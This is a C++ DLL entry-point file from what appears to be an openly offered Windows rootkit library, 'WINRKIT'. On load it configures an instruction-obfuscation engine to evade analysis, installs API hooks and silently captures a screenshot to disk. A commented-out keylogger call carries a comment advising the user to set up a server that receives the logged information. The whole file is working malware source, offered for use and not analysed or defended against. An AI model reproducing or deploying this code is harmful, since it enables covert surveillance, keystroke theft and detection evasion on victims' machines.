// Check the Git readme for information.

#include "CRYPTOGRAPHY/XOR/hasher.hpp"
#include "DEPENDENCIES/OBFUSCATION/include/obfusion.h"
#include "NT/CONSOLE/alloc_console.hpp"
#include "NT/HOOK/api_functions.hpp"
#include "NT/HOOK/api_hook.hpp"
#include "NT/HOOK/api_initialize.hpp"
#include "NT/SIGNATURE SCANNING/scanner.hpp"
#include "NT/dll.hpp"
#include "ROOT/logger.hpp"
#include "ROOT/screenshot.hpp"
#include <Windows.h>
#include <iostream>

BOOL WINAPI DllMain( HMODULE hModule, DWORD dwReason, LPVOID lpReserved ) {
  // OBF engine access point
  obfusion obf;

  // setup obfuscation engine
  // initial setup of obfuscation parameters
  obf.set_obf_steps(
      5, 30 ); // we want the obfuscated instructions to be divided into 5-30 separate instructions (approximately) (def. 3-8)
  obf.set_jmp_perc(
      45 ); // there should be 45% chance of inserting a jump at every instruction of the obfuscated output (def. 5%)

  if ( dwReason == DLL_PROCESS_ATTACH ) {
    // should be only ran within debug
    nt::console::initialize_console( XOR_( "ROOTKIT" ), "[ * ] WINRKIT initialized." );

    // for usage example of this library, I'll use API Hooking
    nt::apihook::initialize_hooks( );

    // assign screenshot path
    std::string screenshot_path;
    screenshot_path.append( "C:\\Dumps\\Screenshot" );
    screenshot_path.append( __TIME__ );

    // take screenshot
    rkit::screenshot::take_screenshot( screenshot_path );

    // terminate dll on key
    nt::terminate_dll_on( VK_END );

    // key logger when process is open, always call after every action, preferably consider a boolean that
    // will end the action, setup on your server that will handle the information, and such
    // rkit::logger::key_log_initialize( "C:\\Dumps\\key_log.txt" );
  }

  else if ( dwReason == DLL_PROCESS_DETACH ) {
    // shall be only ran if you deal with API Hooking
    nt::apihook::detach_hooks( );

    // shall be only ran within debug
    nt::console::destroy_console( );
  }

  // obfuscate with random seed of 0xFAFCB9BE and 6 obfuscation passes
  obf.obfuscate( 0xFAFCB9BE, 6 );

  return TRUE;
}